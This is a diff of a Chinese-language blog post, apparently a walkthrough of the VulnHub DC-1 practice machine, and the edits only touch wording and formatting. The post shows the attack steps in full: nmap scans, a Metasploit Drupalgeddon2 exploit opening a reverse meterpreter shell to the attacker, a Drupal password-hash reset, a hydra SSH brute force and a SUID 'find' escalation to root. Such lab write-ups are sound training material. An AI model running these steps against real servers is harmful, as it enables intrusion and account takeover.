@@ -131,7 +131,7 @@
             </div>
             <!-- Post -->
             <div class="typo" style="padding: 3rem;">
-                <h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>攻击机：kali    网卡NAT模式    192.168.42.149<br>靶机：DC-1    网卡NAT模式<br>靶机下载地址：<a href="https://www.vulnhub.com/?page=2" target="_blank" rel="noopener">https://www.vulnhub.com/?page=2</a></p>
+                <h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>攻击机：kali    网卡NAT模式<br>靶机：DC-1    网卡NAT模式<br>靶机下载地址：<a href="https://www.vulnhub.com/?page=2" target="_blank" rel="noopener">https://www.vulnhub.com/?page=2</a></p>
 <h1 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h1><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>探测靶机IP，使用nmap扫描同网段的主机：<br><blockquote><p>root@kali:~# nmap 192.168.42.0/24 -sP</p>
 </blockquote><br><img src="/images/DC-1/1.jpg"><br>得到靶机IP：192.168.42.151<br>扫描靶机开放端口：<br><blockquote><p>root@kali:~# nmap 192.168.42.151 -A -p 1-65535</p>
 </blockquote><br><img src="/images/DC-1/2.jpg"><br>靶机开放了http服务，ssh服务，rpcbind服务，so<img src="/images/DC-1/3.jpg"></p>
@@ -140,13 +140,12 @@
 </blockquote><br><img src="/images/DC-1/7.jpg"><br>msf渗透drupal：<br><blockquote><p>msf5 &gt; use exploit/unix/webapp/drupal_drupalgeddon2<br>msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; set payload php/meterpreter/reverse_tcp<br>payload =&gt; php/meterpreter/reverse_tcp<br>msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; set RHOSTS 192.168.42.151<br>RHOSTS =&gt; 192.168.42.151<br>msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; set LHOST 192.168.42.157<br>LHOST =&gt; 192.168.42.157<br>msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; exploit</p>
 </blockquote><br>得到一个反弹shell，进入DC-1<br><img src="/images/DC-1/8.jpg"><br>查看一下目录和文件，得到<strong>flag1</strong><br><img src="/images/DC-1/9.jpg"><br>提示配置文件，于是进入site配置文件，<br>目录/var/www/sites/default，找到<strong>flag2</strong>，得到网站数据库的配置信息并提示爆破，<br>使用shell命令切换到cmd的系统权限方式，尝试登陆mysql数据库，<br><img src="/images/DC-1/10.jpg"><br>找到users表，得到用户名和hash加密后的密码，<br><img src="/images/DC-1/11.jpg"><br>于是两个思路，1 爆破；2 重置drupal密码，再update修改数据库密码数据为新密码加密后的密文<br>这里使用思路2，<br><blockquote><p>meterpreter &gt; cd /var/www<br>php scripts/password-hash.sh hahaha    &gt; pwd.php</p>
 </blockquote><br>重新生成密码hahaha的密文，并将结果存入pwd.php文件（这里有个坑，必须在这个目录下执行，不能够再scripts目录下执行）<br><img src="/images/DC-1/12.jpg"><br>再次进入数据库，把生成的密文update到数据库的密码<br>通过浏览器进入靶机，输入用户名密码，登陆成功，找到<strong>flag3</strong><br><img src="/images/DC-1/13.jpg"><br>访问22，尝试爆破ssh密码，可是怎么滴的就知道用户名是flag4了。。。。没有灵性o_o<br>john离线密码破解工具，主要用于破解密码密文；；hydra在线密码破解工具，可以破解ssh啥的，<br>这里使用hydra工具+john中的字典进行爆破：<br><blockquote><p>root@kali:~# hydra -l flag4 -P /usr/share/john/password.lst 192.168.42.151 ssh -f</p>
-</blockquote><br>-f当破解到正确的密码时，停止爆破<br>-vV 显示详细的配置过程<br>-l 指定用户名<br>-P 指定密码字典<br><img src="/images/DC-1/14.jpg"><br>得到账号密码[ flag4/orange ]，登陆ssh，得到<strong>flag4</strong><br><img src="/images/DC-1/15.jpg"><br>提示最后一步需要提权，flag4用户搜索一下含有flag字段的文件，但是根本查不到rot目录下的内容，<br><blockquote><p>Find / -name /<em>flag/</em>    </p>
-</blockquote><br>先查找一下靶机可执行的二进制文件<br><blockquote><p>flag4@DC-1:~# find / -perm -4000 2&gt; /dev/null</p>
+</blockquote><br>-f当破解到正确的密码时，停止爆破<br>-vV 显示详细的配置过程<br>-l 指定用户名<br>-P 指定密码字典<br><img src="/images/DC-1/14.jpg"><br>得到账号密码[ flag4/orange ]，登陆ssh，得到<strong>flag4</strong><br><img src="/images/DC-1/15.jpg"><br>提示最后一步需要提权，flag4用户find搜索一下含有flag字段的文件，但是根本查不到rot目录下的内容，<br>先查找一下靶机可执行的二进制文件,<br><blockquote><p>flag4@DC-1:~# find / -perm -4000 2&gt; /dev/null</p>
 </blockquote><br>使用find提权，find具有SUID标签，所有通过find执行的命令都会root权限运行，<br><blockquote><p>flag4@DC-1:~# touch haha<br>flag4@DC-1:~# find haha -exec “whoami” \;<br>flag4@DC-1:~# find haha -exec “/bin/sh” \;<br> cd /root<br> ls<br> cat thefinalflag.txt</p>
 </blockquote><br><img src="/images/DC-1/16.jpg"></p>
 <p>over！</p>
-<h1 id="get：SUID提权"><a href="#get：SUID提权" class="headerlink" title="get：SUID提权"></a>get：SUID提权</h1><p>suid作用是让普通用户可以以root（或其他）的用户角色运行只有root（或其他）账号才能运行的程序或命令，或程序命令对应本来没有权限操作的文件等。<br>常见的可用于suid提权的命令：<br><blockquote><p>nmap<br>vim<br>find<br>bash<br>more<br>less<br>nano<br>cp</p>
-</blockquote><br>权限具有传递性，当普通用户使用了具有suid标签的命令时，就会继承root用户的权限，可以读取系统中所有的文件。<br>所以本次实战中，先使用<br><blockquote><p>find / -perm -4000 2&gt; /dev/null</p>
+<h1 id="get：SUID提权"><a href="#get：SUID提权" class="headerlink" title="get：SUID提权"></a>get：SUID提权</h1><p><strong>suid作用是让普通用户可以以root（或其他）的用户角色运行只有root（或其他）账号才能运行的程序或命令，或程序命令对应本来没有权限操作的文件等。</strong><br>常见的可用于suid提权的命令：<br><blockquote><p>nmap<br>vim<br>find<br>bash<br>more<br>less<br>nano<br>cp</p>
+</blockquote><br><strong>权限具有传递性，当普通用户使用了具有suid标签的命令时，就会继承root用户的权限，可以读取系统中所有的文件。</strong><br>所以本次实战中，先使用<br><blockquote><p>find / -perm -4000 2&gt; /dev/null</p>
 </blockquote><br>指令查找了当前用户可以执行的命令，找到find，<br>再使用find命令，配合-exec参数，可以对查询的文件进行进一步的操作。<br>-exec参数后面跟的是command命令，终止必须使用’;’分号来判断。<br>对于不同的系统，直接使用分号可能会有不同的意义，所以在分号前使用转义符’\’。</p>
 
             </div>
